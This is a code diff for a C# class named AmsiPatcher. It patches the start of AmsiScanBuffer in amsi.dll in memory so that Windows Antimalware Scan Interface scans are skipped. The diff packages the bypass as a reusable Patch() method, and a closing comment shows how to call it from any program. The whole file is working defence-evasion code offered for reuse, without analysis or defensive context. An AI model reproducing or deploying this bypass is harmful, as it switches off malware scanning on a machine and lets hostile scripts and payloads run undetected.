@@ -1,8 +1,9 @@
+using System;
 using System.Runtime.InteropServices;
 
 namespace Patch
 {
-    internal static class Program
+    internal class AmsiPatcher
     {
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -13,13 +14,13 @@ namespace Patch
         [DllImport("kernel32.dll")]
         private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
-        private static void AMSI()
+        public void Patch()
         {
             IntPtr Library = LoadLibrary("amsi.dll");
             IntPtr Address = GetProcAddress(Library, "AmsiScanBuffer");
             uint p;
           
-            Byte[] Patch = {
+            byte[] Patch = {
                 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
             };
           
@@ -27,12 +28,24 @@ namespace Patch
             Marshal.Copy(Patch, 0, Address, Patch.Length);
             VirtualProtect(Address, (UIntPtr)Patch.Length, p, out p);
         }
-
-        [STAThread]
-        static void Main()
-        {
-            AMSI();
-            Console.WriteLine("Patched");
-        }
     }
 }
+
+// You can call this Patcher now in any file with 'patcher.Patch();'
+// Example:
+
+// using System;
+// namespace Patch
+// {
+//     internal static class Program
+//     {
+//         [STAThread]
+//         static void Main()
+//         {
+//             AmsiPatcher patcher = new AmsiPatcher();
+//             patcher.Patch();
+//             
+//             Console.WriteLine("Patched");
+//         }
+//     }
+// }
